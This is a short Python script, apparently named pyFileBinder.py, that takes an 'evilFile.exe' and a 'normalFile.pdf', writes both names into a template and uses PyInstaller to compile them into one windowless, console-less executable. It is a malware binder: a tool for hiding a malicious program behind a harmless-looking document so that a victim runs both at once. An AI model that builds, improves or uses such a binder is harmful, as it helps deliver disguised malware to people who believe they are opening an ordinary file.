import os, sys, re

try:
    evilFile = sys.argv[1]
    normalFile = sys.argv[2]
except:
    print('try: python pyFileBinder.py evilFile.exe normalFile.pdf')

try:
    with open("demo.py","rt") as fin:
        with open("pyinstall.py","wt") as f:
            for line in fin:
                f.write(line.replace('demo.exe', evilFile).replace('demo.pdf', normalFile))
except:
    print('try: python pyFileBinder.py evilFile.exe normalFile.pdf')

cmd = 'pyinstaller -F pyinstall.py --add-data "{};." --add-data "{};." -w --noconsole'.format(evilFile,normalFile)
os.system(cmd)